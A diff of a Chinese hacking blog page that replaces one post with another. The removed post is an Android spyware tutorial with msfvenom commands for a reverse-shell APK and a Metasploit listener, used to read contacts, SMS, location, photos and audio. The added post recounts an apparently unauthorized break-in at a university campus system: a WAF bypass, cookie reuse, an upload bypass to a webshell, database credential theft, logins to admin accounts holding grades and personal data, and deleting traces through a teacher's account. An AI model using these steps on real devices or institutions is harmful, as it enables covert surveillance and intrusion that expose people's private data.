@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>远控手机实验 | HackLog</title>
-  <meta name="keywords" content=" 移动 ">
-  <meta name="description" content="远控手机实验 | HackLog">
+  <title>实战-某大学数字校园系统 | HackLog</title>
+  <meta name="keywords" content=" 实战 ">
+  <meta name="description" content="实战-某大学数字校园系统 | HackLog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
@@ -358,9 +358,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-10-androidhack" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-11-bestschack" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">远控手机实验</h1>
+        <h1 class="article-title">实战-某大学数字校园系统</h1>
     
     <div class="article-meta">
         
@@ -370,19 +370,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">移动</a>
+            <a class="color3">实战</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-10-08 23:11:21'>2021-10-08 22:28</time>
+            发布时间 : <time class="date" title='最后更新: 2021-10-22 23:30:15'>2021-10-22 22:16</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:368</span>
+        <span>字数:1.2k</span>
         
         
         
@@ -390,7 +390,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E6%9C%A8%E9%A9%AC"><span class="toc-text">准备木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-text">监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E6%8E%A7"><span class="toc-text">远控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E6%8B%AC%E8%AF%BB%E5%8F%96%E9%80%9A%E8%AE%AF%E5%BD%95%E5%95%8A%EF%BC%8C%E7%9F%AD%E4%BF%A1%E5%95%8A%EF%BC%8C%E9%80%9A%E8%AF%9D%E8%AE%B0%E5%BD%95%E7%AD%89%E7%AD%89"><span class="toc-text">包括读取通讯录啊，短信啊，通话记录等等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%8D%E6%91%84%E7%85%A7%E7%89%87"><span class="toc-text">拍摄照片</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D"><span class="toc-text">定位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%95%E9%9F%B3"><span class="toc-text">录音</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-text">结论</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-text">WAF绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E5%90%8E%E5%8F%B0%E9%99%90%E5%88%B6"><span class="toc-text">过后台限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E"><span class="toc-text">挖掘漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">后渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E5%B0%BE%E5%B7%A5%E4%BD%9C"><span class="toc-text">收尾工作</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -406,34 +406,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="准备木马"><a href="#准备木马" class="headerlink" title="准备木马"></a>准备木马</h2><p>我就用msf来做这个实验，首先venome生成安卓的小马，就选android/meterpreter/reverse_tcp这个，然后设置好LHOST</p>
-<pre><code class="sh">msfvenome -l payloads
-msfvenome -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R &gt; xxx.apk
-</code></pre>
-<p>这个马到时候会反弹一个meterpreter回来，但是安装会报毒，所以我们安装的时候要把封锁解掉，同时要把他的后台运行等打开，再给权限。</p>
-<p>github上面有马和服务端生成器的项目，但是我不建议用，因为安全性还是要画个大大的问号，如果有后门那就中大招了</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a></li>
-</ul>
-<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p>msfconsole里面准备好，首先开启监听</p>
-<pre><code class="sh">msfconsole
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST xxx
-set SessionCommunicationTimeout 100000000 //连接无活动失效时间
-set SessionExpirationTimeout 100000000 //连接有效期
-</code></pre>
-<p>设置好之后直接exploit</p>
-<p>然后打开小马，接下来就会反弹到一个meterpreter</p>
-<p><img src="/posts/alfkfaqertqotlc/1.png"></p>
-<h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>可以做的事情太多了，就不废话了</p>
-<p><img src="/posts/alfkfaqertqotlc/2.png"></p>
-<h4 id="包括读取通讯录啊，短信啊，通话记录等等"><a href="#包括读取通讯录啊，短信啊，通话记录等等" class="headerlink" title="包括读取通讯录啊，短信啊，通话记录等等"></a>包括读取通讯录啊，短信啊，通话记录等等</h4><p><img src="/posts/alfkfaqertqotlc/4.png"></p>
-<h4 id="拍摄照片"><a href="#拍摄照片" class="headerlink" title="拍摄照片"></a>拍摄照片</h4><p>拍近照有点糊</p>
-<p><img src="/posts/alfkfaqertqotlc/3.png"></p>
-<h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p><img src="/posts/alfkfaqertqotlc/5.png"></p>
-<h4 id="录音"><a href="#录音" class="headerlink" title="录音"></a>录音</h4><p><img src="/posts/alfkfaqertqotlc/6.png"></p>
-<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这还算是比较初级的实验，没有涉及到apk签名啊免杀啊乱七八糟的，威力凑合，不过msf的也不是很好用，容易断，如果要做一个的话还是需要自己改，配合组合拳来打，这种可以用在近源渗透上面的话还是不错的。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次渗透测试由于涉及过多敏感信息，因此纯文字讲述，无图，不公开漏洞利用代码、工具、木马，仅仅讲述思路，以及一些善意建议。</p>
+<p>坚持反对违反社会公俗道德、以及为谋私利而祸害四方的行为，如有人意图借此作恶，后果自负。</p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>先尝试在前台挖掘漏洞，这个站是aspx搭建的，也没有看到伪静态，于是通过get参数来测试sql注入，但是遇到了WAF，麻雀虽小五脏俱全。这个WAF还是个云盾，这年头云盾越来越流行了，像什么阿里云，云锁等等各个都壮如牛猛如虎，不过是可以绕过的。刚开始还不知道是什么WAF，用了WAFW00f，但并不靠谱，测不出来，看图识waf也没看出来，看出来还挺像云锁，只不过云锁是绿的，最后不管三七二十一，先绕WAF再说，由于云waf并不是在本机上运行着的，意味着，只要找到他的真实IP地址，就可以直接绕过，我先是用了全球Ping，但是他的CDN测的地方全都覆盖到了，然后又去查他的DNS记录，基本上都查不到，有一个平台发现一条，但是需要付费，然后子域名也没有，就一个主域名，邮箱反查也没线索。不过靠资产测绘平台fofa搜索他的title指纹，最后找到了真实IP地址，并通过nslookup找到了他解析到的云盾的名称，查出来属于是创宇盾。</p>
+<h2 id="过后台限制"><a href="#过后台限制" class="headerlink" title="过后台限制"></a>过后台限制</h2><p>他的后台就只有用主站的域名去访问才跳转到那，用真实IP就不行，但是我们可以利用cookie来狸猫换太子，先登录到有域名的后台，然后再把cookie赋值给真实IP再直接访问后台链接，就可以过后台限制了。</p>
+<h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><p>前台的sql不被waf拦了，但是放工具里面跑，都没有测出来有注入漏洞，就先放弃前台sql注入了，然后到后台挖洞，后台也可能存在注入，但是选择先测试上传点，在某门课的在线交流板块，我通过后缀名加空格配合windows机制(指纹显示这台sever属于windows server 2008)，然后成功绕过了对方的黑名单限制，上传了网马，拿到web权限。</p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>通过web权限(把网马放到前台，就不需要cookie了)，我们寻找配置文件来读取数据库用户名密码信息，最后找到sa账户和密码，链接sqlserver数据库，接下来可以进行提权，由于已经有了sqlserver的sa权限，因此提权非常简单，但我不是违法犯罪，没有必要把整个服务器的权限都拿到，如果过于激进操作，会徒增麻烦和危险。既然目的仅仅是对方的数字校园系统的安全性，那就直接提取mssql中的数据，拿到了系统管理员的账户，并成功登录，里面的功能非常敏感，有可以修改成绩以及各种高敏感操作，同时可以查询很多人的身份信息，包括教师与学生，如果这样一个高权账号被攻击者拿到了，那后果简直不堪设想。同样的，也登录了system账号，这个账号可以读取访问日志，存在备份功能，这又是一个可能的攻击点。</p>
+<h2 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h2><p>测试到这该做收尾工作了(没有修改过系统里的任何文件)，首先是得把之前上传留着的网马清楚掉，由于是在某位老师的在线交流板块下上传的文件，而老师是拥有删除这个讨论的权限的，因此，直接从数据库中找出对应老师的账户，登录后删除，在webapp内也没有了留下的痕迹。最后写下这篇文章，总结一下整个过程，其实这整个数字校园系统做的安全措施还是有的，WAF有国内一流的创宇盾，有前后台分离，也没测出来sql注入，真实IP限制访问后台，文件上传处有黑名单过滤，服务器还装了杀软等等，但是这些安全措施都被逐个击破之后，就变得非常脆弱。</p>
+<p>这次实战也是学到不少，同时揭露了许多数字校园系统的脆弱性，事实上比这个大学安全性做的差的只多不少。不管怎么说，网络安全终究还是攻与防的较量，此一时彼一时，就像今年的诺奖一样，归根结底复杂系统才是常态。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达，点赞有惊喜。 </span>
@@ -447,12 +427,12 @@ set SessionExpirationTimeout 100000000 //连接有效期
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>远控手机实验</p>
-    <p><span class="copy-title">字数:</span><span class="post-count">368</span></p>
+    <p><span class="copy-title">文章标题:</span>实战-某大学数字校园系统</p>
+    <p><span class="copy-title">字数:</span><span class="post-count">1.2k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Z3rg">Z3rg</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-10-08, 22:28:40</p>
-    <p><span class="copy-title">最后更新:</span>2021-10-08, 23:11:21</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/alfkfaqertqotlc/" title="远控手机实验">https://swertluck.vip/posts/alfkfaqertqotlc/</a>
+    <p><span class="copy-title">发布时间:</span>2021-10-22, 22:16:42</p>
+    <p><span class="copy-title">最后更新:</span>2021-10-22, 23:30:15</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/nektriulqqowri/" title="实战-某大学数字校园系统">https://swertluck.vip/posts/nektriulqqowri/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#34;署名-非商用-相同方式共享 4.0&#34;</a> 转载请保留原文链接及作者。
     </p>
